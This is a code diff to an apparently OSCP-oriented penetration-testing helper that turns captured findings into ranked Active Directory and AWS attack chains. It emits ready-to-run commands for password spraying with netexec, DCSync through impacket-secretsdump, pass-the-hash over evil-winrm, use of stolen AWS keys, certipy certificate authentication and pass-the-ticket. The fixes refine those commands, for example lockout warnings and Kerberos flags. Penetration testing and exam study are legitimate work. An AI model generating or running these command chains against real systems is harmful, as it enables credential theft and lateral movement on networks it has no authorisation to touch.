@@ -219,11 +219,25 @@ def run(report, store, ui=None):
         mach = _machine(src, root)
         smb = svc_on(mach, "smb") or dc_for(mach)
         utoken = ul or f"'{disp}'"
+        # iter-16: spray safety gating
+        #   - lockout-threshold guardrail when known
+        #   - -k flag only when user-cred carries kerberos context (FQDN
+        #     username or netexec_db kerberos hit); blind addition causes
+        #     "kerberos config missing" errors when $KRB5CCNAME is unset.
+        #   - DCSync caveat moved to its own command (was an inline #-comment
+        #     that the operator could miss)
+        lockout = getattr(store, "lockout_threshold", None)
+        lockout_note = ""
+        if lockout and lockout > 0:
+            lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
+                            f"do NOT spray more attempts than {lockout - 1} per user")
+        has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
+        krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
         chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
             crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
-            commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success" +
-                      ("" if utoken == "users.txt" else " -k"),
-                      f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc   # if (Pwn3d!)"],
+            commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
+                      f"# AFTER confirming Pwn3d! on {smb}, then dcsync (gates the secretsdump):",
+                      f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"],
             src=src, line=ln))
         wh = svc_on(mach, "winrm")
         if wh:
@@ -316,8 +330,11 @@ def run(report, store, ui=None):
             if wh:
                 break
         if wh:
-            cmd_wh = (f"evil-winrm -i {wh} -u '{u}' -H {h0}"
-                      + ("    # NOTE: local-SAM hash; ensure {wh} == originating host" if local_origin else ""))
+            # iter-16: was f-string-then-concat; the {wh} in the NOTE half
+            # was a literal '{wh}' instead of the interpolated value.
+            note = (f"    # NOTE: local-SAM hash; ensure {wh} == originating host"
+                    if local_origin else "")
+            cmd_wh = f"evil-winrm -i {wh} -u '{u}' -H {h0}{note}"
             chains.append(Chain("R8", "PtH winrm", f"PtH -> WinRM {wh}",
                 crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
                 commands=[cmd_wh], src=src0, line=ln0, count=n))
@@ -363,16 +380,26 @@ def run(report, store, ui=None):
                 # non-DC SMB (8.93) wins by default. AWS is also mostly out-of-
                 # scope for the OSCP+ AD exam path - keep findable but never
                 # poison the top of the queue when AD context is rich.
+                # iter-16: AKIA = long-lived (no session token), ASIA = STS
+                # temp (REQUIRES session token). The IMDS rule captures the
+                # token; if available, paste it from the IMDS finding's
+                # 'AWS Session Token' line. Add the export line as a hint.
+                is_sts = akid.startswith("ASIA")
+                cmds = [
+                    f"export AWS_ACCESS_KEY_ID={akid}",
+                    f"export AWS_SECRET_ACCESS_KEY={sak}",
+                ]
+                if is_sts:
+                    cmds.append("export AWS_SESSION_TOKEN=<paste from IMDS finding 'Session Token'>"
+                                "    # REQUIRED for ASIA keys, optional for AKIA")
+                cmds += [
+                    "aws sts get-caller-identity",
+                    "aws s3 ls; aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
+                ]
                 chains.append(Chain("R30", "AWS auth-complete",
                     f"AWS access+secret pair: {akid} / {sak[:8]}...",
                     crit=9, conf=0.9, ready=1.5, prox=0.7,        # score 8.51
-                    commands=[
-                        f"export AWS_ACCESS_KEY_ID={akid}",
-                        f"export AWS_SECRET_ACCESS_KEY={sak}",
-                        "aws sts get-caller-identity",
-                        "aws s3 ls; aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
-                    ],
-                    src=path, line=akline))
+                    commands=cmds, src=path, line=akline))
                 break  # one pair per akid
 
     # default creds -> log in directly. iter-13: demoted from crit=8/conf=1.0
@@ -434,18 +461,27 @@ def run(report, store, ui=None):
             src=s, line=l))
     # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
     # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
+    # iter-16: previous command never passed -password, so Certipy halted
+    # at the PFX-unlock prompt. Add the placeholder so the operator knows
+    # to populate it from the captured 'PFX cert password' finding (R7
+    # secondary or keyword.py PFX rule).
     if e.has_cert:
         s, l = e.cert_src
         chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
             crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
-            commands=[f"certipy auth -pfx <file.pfx> -dc-ip {dc()}",
+            commands=[f"certipy auth -pfx <file.pfx> -password '<pfx-password-if-set>' -dc-ip {dc()}",
                       "then PtH the recovered NT hash (see R7)"], src=s, line=l))
-    # ccache / kirbi
+    # ccache / kirbi. iter-16: removed literal '-FQDN' suffix on dc() that
+    # produced an unresolvable hostname '10.10.10.5-FQDN'. Kerberos requires
+    # the DC's actual FQDN (the SPN in the ticket), so we tell the operator
+    # to substitute - we cannot resolve IP -> FQDN passively.
     if e.has_ccache:
         s, l = e.ccache_src
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
-            commands=[f"export KRB5CCNAME=<ticket.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<user>@{dc()}-FQDN"],
+            commands=[f"export KRB5CCNAME=<ticket.ccache>; "
+                      f"impacket-secretsdump -k -no-pass <DOMAIN>/<user>@<DC-FQDN>   "
+                      f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
             src=s, line=l))
     # shadow
     if e.has_shadow:
